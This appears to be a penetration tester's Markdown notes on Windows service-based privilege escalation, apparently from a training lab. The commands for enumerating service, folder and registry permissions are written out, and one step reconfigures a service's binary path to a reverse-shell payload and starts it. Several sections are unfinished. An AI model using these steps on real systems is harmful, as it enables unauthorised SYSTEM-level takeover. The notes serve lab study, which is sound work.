# Service Exploits
-------

```cmd
sc.exe qc <name> REM query service configuration

sc.exe query <name> REM query current status

sc.exe config <name> <option>= <value> REM modify configuration option

net start/stop <name> REM start stop

accesschk.exe /accepteula -ucqv user regsvc REM check permissions for a service

accesscheck.exe /accepteula -uvw "C:\Program Files"
REM check permissions
```

```cmd
.\winPEASany.exe quiet serviceinfo
```

---------------

## Insecure Service Permissions

If the user has permissions to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to a malicious one; granted we can start/stop the service or restart the machine.

Using winpeas to enumerate services information: 
```cmd
.\winPEASany.exe quiet serviceinfo
```

```cmd
LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    daclsvc: WriteData/CreateFiles
```

Using access check to check permissions:
```cmd
.\accesschk.exe /accepteula -uwcqv user daclsvc
```

Query  service configuration:
```cmd
sc qc daclsvc
```

Query service status:
```cmd
sc query daclsvc
```

Set the binary path to the location of the payload:
```
sc config daclsvc binpath= "\"C:\Temp\reverse.exe""
```

Start the service:
```cmd
net start daclsvc
```

--------------

## Unquoted Service Paths

https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/
https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths

Checking for unquoted service paths:
```cmd
HKLM\SYSTEM\CurrentControlSet\Services\Servicename
```

```cmd
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

Checking if we have write permissions over the directory using accesschk:

```cmd
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

Create an executable and place it in the folder; then restart the service.

-----------------

## Weak Registry Permissions

Lookout for **Modify any service registry** in winpeas

Once found, we can edit registry entry for a service; we can use powershell or accesschk to verify permissions:

```Powershell
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```

```cmd
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

- [ ] Check more on this!!!!!!!

-------------------

## Insecure Service Executables

If the original service exe is modifiable by our user, we can replace it w a malicious one to get back a reverse shell.


-------------


## DLL Hijacking

If a DLL is loaded with an absolute path and is writable by our user, we can elevate privileges.

We can also abuse this if a DLL is missing from the system and our user has write access to the directory.
